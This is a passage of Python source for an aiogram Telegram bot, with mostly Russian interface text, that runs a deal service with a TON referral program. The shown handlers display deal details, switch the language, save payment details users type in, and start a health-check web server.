            f"Описание: {d.get('description', '—')}\n"
            f"Статус: {deal_status_text(d)}"
        )
    await state.clear()

# ===== ДЕТАЛИ СДЕЛКИ =====
@dp.callback_query(F.data.startswith("deal_info_"))
async def deal_info_handler(call: CallbackQuery):
    did = int(call.data.split("_")[2])
    d = deals.get(did)
    if not d:
        await call.answer("Сделка не найдена", show_alert=True)
        return
    txt = (
        f"<b>Сделка #{did}</b>\n"
        f"Продавец: {username_or_id(d['seller_id'])}\n"
        f"Покупатель: {username_or_id(d['buyer_id'])}\n"
        f"Сумма: {d['amount']} {emoji('ruble', call.from_user.id)}\n"
        f"Валюта: {d['currency']}\n"
        f"Описание: {d.get('description', '—')}\n"
        f"Статус: {deal_status_text(d)}\n"
        f"Код: <code>#{d.get('invite_code', '—')}</code>"
    )
    await call.message.answer(txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад к списку", callback_data="my_deals")]
    ]))

# ===== РЕФЕРАЛЫ =====
@dp.callback_query(F.data == "referrals")
async def referrals_handler(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id; lang = get_lang(uid)
    refs = users.get(uid, {}).get("referrals", [])
    bot_username = (await bot.me()).username
    link = f"https://t.me/{bot_username}?start={uid}"
    earned_ton = users.get(uid, {}).get("ref_earned_ton", 0.0)
    txt = (
        f"{emoji('people', uid)} Реферальная программа\n\n"
        f"<blockquote>🔗 Ваша ссылка:\n{link}\n\n"
        f"{emoji('people', uid)} Рефералов: <b>{len(refs)}</b>\n"
        f"{emoji('balance_icon', uid)} Заработано: <b>{earned_ton}</b> TON</blockquote>\n\n"
        f"{emoji('coin', uid)} Бонус: 50% от комиссии с каждой сделки реферала!"
    ) if lang=="ru" else (
        f"{emoji('people', uid)} Referral Program\n\n"
        f"<blockquote>🔗 Your link:\n{link}\n\n"
        f"{emoji('people', uid)} Referrals: <b>{len(refs)}</b>\n"
        f"{emoji('balance_icon', uid)} Earned: <b>{earned_ton}</b> TON</blockquote>\n\n"
        f"{emoji('coin', uid)} Bonus: 50% commission from each referral deal!"
    )
    await delete_and_send_banner(call, txt, back_button(lang))

# ===== СМЕНА ЯЗЫКА =====
@dp.callback_query(F.data == "change_lang")
async def lang_cb(call: CallbackQuery):
    update_premium(call.from_user)
    uid = call.from_user.id
    cur_lang = users.setdefault(uid, {}).setdefault("lang", "ru")
    new_lang = "en" if cur_lang == "ru" else "ru"
    users[uid]["lang"] = new_lang
    await return_to_main(call, new_lang)

# ===== ВВОД РЕКВИЗИТОВ (общий обработчик) =====
@dp.message()
async def handle_rekv_input(message: Message):
    update_premium(message.from_user)
    uid = message.from_user.id
    if uid in users and users[uid].get("pending_rekv"):
        key = users[uid]["pending_rekv"]
        users[uid][key] = message.text
        users[uid]["pending_rekv"] = None
        lang = get_lang(uid)
        await message.answer("✅ Сохранено!", reply_markup=main_menu(lang, uid))

# ===== HTTP-СЕРВЕР =====
async def handle_health(request):
    return web.Response(text="OK", status=200)

async def run_web_server():
    app = web.Application()
    app.router.add_get("/", handle_health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logging.info(f"HTTP server started on port {PORT}")

async def main():
    logging.info("Запуск бота и HTTP-сервера...")
    try: await bot.session.close()
    except: pass
    await asyncio.sleep(1.5)
    await bot.delete_webhook(drop_pending_updates=True)
    await asyncio.sleep(0.5)
    await run_web_server()
    await dp.start_polling(
        bot,
        allowed_updates=dp.resolve_used_update_types(),
        polling_timeout=20,
        handle_as_tasks=True
    )

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda s,f: sys.exit(0))
    signal.signal(signal.SIGTERM, lambda s,f: sys.exit(0))
    asyncio.run(main())
